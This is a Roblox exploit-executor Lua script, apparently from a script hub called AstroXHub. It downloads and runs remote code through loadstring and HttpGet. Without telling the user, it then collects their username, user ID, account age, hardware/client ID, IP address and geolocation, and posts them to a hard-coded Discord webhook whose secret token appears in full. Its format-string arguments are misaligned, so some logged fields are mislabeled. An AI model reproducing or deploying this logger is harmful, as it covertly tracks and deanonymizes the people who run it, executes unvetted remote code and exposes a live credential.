local Alert = loadstring(game:HttpGet("https://raw.githubusercontent.com/AstroXTeam/Project-/refs/heads/main/Alert"))()
Alert:create("Webhook Is Enabled!")
local bannedHWID = ""
local function checkAndKickPlayer()
    local player = game:GetService("Players").LocalPlayer
    local playerHWID = player.UserId
    if playerHWID == bannedHWID then
        player:Kick("You Have Been Banned From AstroXHub To Unban Come to Telegram \n لقد تم تبنيدك من سكربت استرو اكس لحل مشكله تعال التليكرام \n تم نسخ رابط • Copy telegram link")
    end
end    
checkAndKickPlayer()
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1297939101235937301/1330330257542217838/Screenshot_-_1.jpg?ex=678d9619&is=678c4499&hm=5cd2e131984ba7fad645e525ad860fabf83f0be66f4ae7ada375daf0fd66edc3&",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nHwid:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, AccountAge, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                     ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = ""
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1329954213811191913/gKQDWRFNoJjl2wIq6Ra8VazUAIx85EnKfTEXTwHa0e4gMuou3va-9hg0J53tFP_RnkrT"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)

